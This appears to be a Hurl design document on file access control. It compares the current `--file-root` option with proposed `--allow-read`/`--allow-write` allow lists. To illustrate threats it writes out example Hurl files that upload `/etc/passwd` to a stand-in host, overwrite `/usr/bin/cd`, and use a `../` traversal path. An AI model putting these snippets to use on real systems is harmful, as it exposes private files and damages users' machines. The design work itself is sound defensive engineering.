# Read/Write Access Control


Hurl uses several command line options that refer to local path files, like `curl`: `--output`, `--key` etc... In the Hurl
file format, users can also refer to local path files:

- Through `[Options]` section: `[Options]` section is a way to override command line options, to configure a specific
request without affecting others.

```hurl
GET https://foo.com/cd-infected
[Options]
output: /usr/bin/cd
```

- Through request body and multipart requests to create an HTTP request body from a local file.

```hurl
POST https://foo.com
file,/etc/passwd;
```

```hurl
POST https://foo.com
[Multipart]
field: file,/etc/passwd;
```

Since the first versions of the file format, maintainers were concerned that a simple Hurl command, like `hurl foo.hurl`
might exfiltrate important local files to an HTTP server without users explicitly authorizing it. The idea was that, like curl,
command line options were written on the command line and so the authorization was explicit, while files inside a Hurl file
could be run without a user reading its content. A possible scenario: running a Hurl file that uploads `/etc/passwd` for instance.

An option was introduced in Hurl, `--file-root`: inspired by [WireMock](https://wiremock.org) and its `mappings/__files`
mock directories structure, the idea has been to provide a new file root that is used to resolve relative paths.
Descendants of the file root have read/write authorization. Outside of this file root, the read/write access is not authorized.
When not specified, a relative path reference in a Hurl file is resolved from the directory containing the Hurl file.


## List of file based options and features as of Hurl 8.0.1 (2027-07-17)

| Name                        | Origin                 | R/W        | Relative to                                                                     | Access control ? | Comment                                                                                                                                                           |
|-----------------------------|------------------------|------------|---------------------------------------------------------------------------------|------------------|-------------------------------------------------------------------------------------------------------------------------------------------------------------------|
| `--cacert path`             | command line           | read       | current directory                                                               | no ❌             | Directly passed as-is to libcurl through `CURLOPT_CAINFO`                                                                                                         |
| `cacert: path`              | `[Options]` section    | read       | current directory                                                               | no ❌             | Directly passed as-is to libcurl through `CURLOPT_CAINFO`                                                                                                         |
| `--cert path`               | command line           | read       | current directory                                                               | no ❌             | Directly passed as-is to libcurl through `CURLOPT_SSLCERT`                                                                                                        |
| `cert: path`                | `[Options]` section    | read       | current directory                                                               | no ❌             | Directly passed as-is to libcurl through `CURLOPT_SSLCERT`                                                                                                        |
| `--key path`                | command line           | read       | current directory                                                               | no ❌             | Directly passed as-is to libcurl through `CURLOPT_SSLKEY`                                                                                                         |
| `key: path`                 | `[Options]` section    | read       | current directory                                                               | no ❌             | Directly passed as-is to libcurl through `CURLOPT_SSLKEY`                                                                                                         |
| `--unix-socket path`        | command line           | read       | current directory                                                               | no ❌             | Directly passed as-is to libcurl through `CURLOPT_UNIX_SOCKET_PATH`                                                                                               |
| `unix-socket: path`         | `[Options]` section    | read       | current directory                                                               | no ❌             | Directly passed as-is to libcurl through `CURLOPT_UNIX_SOCKET_PATH`                                                                                               |
| `--curl path`               | command line           | write      | current directory                                                               | no ❌             |                                                                                                                                                                   |
| `--output`                  | command line           | write      | current directory                                                               | no ❌             |                                                                                                                                                                   |
| `output: path`              | `[Options]` section    | write      | Hurl file directory if `--file-root` not set<br>`file-root` directory otherwise | yes ✅            | error example `unauthorized access to file /tmp/priv/out.txt, check --file-root option`<br/>The curl command in verbose mode shows the relative path constructed. |
| `--secrets-file`            | command line           | read       | current directory                                                               | no ❌             |                                                                                                                                                                   |
| `--variables-file`          | command line           | read       | current directory                                                               | no ❌             |                                                                                                                                                                   |
| `--report-html`             | command line           | read/write | current directory                                                               | no ❌             |                                                                                                                                                                   |
| `--report-json`             | command line           | read/write | current directory                                                               | no ❌             |                                                                                                                                                                   |
| `--report-junit`            | command line           | read/write | current directory                                                               | no ❌             |                                                                                                                                                                   |
| `--report-tap`              | command line           | read/write | current directory                                                               | no ❌             |                                                                                                                                                                   |
| `--cookie`                  | command line           | read       |                                                                                 | no ❌             |                                                                                                                                                                   |
| `--cookie-jar`              | command line           | write      |                                                                                 | no ❌             |                                                                                                                                                                   |
| `--file-root`               | command line           | read/write | current directory                                                               | no ❌             |                                                                                                                                                                   |
| `--glob`                    | command line           | read       | current directory                                                               | no ❌             |                                                                                                                                                                   |
| `--netrc-file`              | command line           | read       | current directory                                                               | no ❌             |                                                                                                                                                                   |
| `netrc-file: path`          | `[Options]` section    | read       | current directory                                                               | no ❌             | Directly passed as-is to libcurl through `CURLOPT_NETRC_FILE`                                                                                                     |
| `file,data.bin;`            | request file body      | read       | Hurl file directory if `--file-root` not set<br>`file-root` directory otherwise | yes ✅            |                                                                                                                                                                   |
| `field2: file,example.txt;` | request multipart form | read       | Hurl file directory if `--file-root` not set<br>`file-root` directory otherwise | yes ✅            |                                                                                                                                                                   |                                                                                                                                                             |


## Analysis as of Hurl 8.0.1 (2027-07-17)

3 use cases are "sanitized" through access control:

- Write access with `output` in `[Options]` section:

```hurl
GET https://foo.com/cd-infected
[Options]
output: /usr/bin/cd
```

This was set to avoid overwriting user files when running a seemingly innocuous Hurl file `hurl foo.hurl`.

- Read access with request body:

```hurl
POST https://foo.com
file,/etc/passwd;
```

This was set to avoid reading private user files when running a seemingly innocuous Hurl file `hurl foo.hurl`.

- Read access with request multipart form (same as previous):

```hurl
POST https://foo.com
[Multipart]
field: file,/etc/passwd;
```

This was set to avoid reading private user files when running a seemingly innocuous Hurl file `hurl foo.hurl`.

## Proposal for change

In this issue <https://github.com/Orange-OpenSource/hurl/issues/2830>, the maintainers find the current option `--file-root`
too difficult to use and understand (see for instance [Upload file using MultipartFormData is not working](https://github.com/Orange-OpenSource/hurl/issues/3917)).
The implementation was buggy and has been through several issues (see for instance [--file-root is not taken into account for --output option](https://github.com/Orange-OpenSource/hurl/issues/2445)).
Future options will also use file paths (like `--grpc-protoset`), so we want to clean up path handling before adding them.

The real problem with `--file-root` is that it mixes two separate concerns:

- **Path resolution**: where a relative path in a Hurl file starts from;
- **Access control**: which files can be read or written.

Because access control is tied to a *changed* resolution root, the path a user writes is not the path that gets checked.
This makes the option hard to understand and hard to get right (hence the bugs above). The proposal splits these two
concerns: paths always start from the Hurl file directory, and access control is a separate allow list.

A proposal, inspired by [Deno security and permissions options](https://docs.deno.com/runtime/fundamentals/security/),
has been made to introduce two new options `--allow-read`/`--allow-write`: 

- The user explicitly grants read/write access to "inner" path references
- "Inner" path references are always resolved relative to the directory containing the source Hurl file (like file references in a Dockerfile)
- Access control is checked against the allow list, without any "file root substitution"

## Migration plan

We want to ensure a smooth upgrade to `--allow-read`/`--allow-write`:

- Introduce `--allow-read`/`--allow-write`, and deprecate `--file-root`
- Make access control error messages reference `--allow-read` for a read failure and `--allow-write` for a write failure
- Show a warning when `--file-root` is used
- In a later version, remove `--file-root` from the documentation, man, help but keep supporting the option
- In the (not too distant) future, remove `--file-root` entirely

## Open questions

- **Should all in-file paths be checked the same way?** Today, only 3 in-file references are checked (`output:` in
  `[Options]`, request body file, multipart file), while other in-file references (`cacert:`, `cert:`, `key:`,
  `unix-socket:`, `netrc-file:` in an `[Options]` section) can read any local file with no access control. If paths
  inside a Hurl file are really untrusted, then every in-file path should go through the same allow list? Do we want that,
  or keep the paths passed to libcurl out of it (and if so, why)? List of current `[Options]` options used in public 
  Hurl files on GitHub: `aws-sigv4`, `cert`, `compressed`, `connect-to`, `key`, `delay`, `http2`, `insecure`, `location`,
  `location-trusted`, `max-redirs`, `retry`, `retry-interval`, `skip`, `output`, `user`, `variable`, `verbose` (to see 
  impact of a mandotory in-file path allow list)
- **What is the default allow list?** Deno blocks everything by default, but that would break existing Hurl files. For a
  safer migration, the default should still allow the Hurl file directory (and its subdirectories) to be read and
  written, so that `hurl foo.hurl` keeps working without any flag. `--allow-read`/`--allow-write` then *add* paths on top
  of that. 

## Caveats

- **No more path relocation.** `--file-root` did two things: it moved where relative paths start from (WireMock
  `__files`-style) and it controlled access; `--allow-read`/`--allow-write` only control access. There is no direct
  replacement for the path relocation, so users who used `--file-root` to move their relative paths will need to adjust.
  This means the migration is not just adding new options.
- **Paths must be canonicalized.** The allow list check must resolve `..` and symlinks *before* matching, or else
  `--allow-read ./data` together with `./data/../../etc/passwd` (or a symlink inside `./data`) would get around it. This
  is the same kind of bug that plagued `--file-root`, so canonicalizing both the allowed paths and the accessed path is a
  hard requirement.
- 




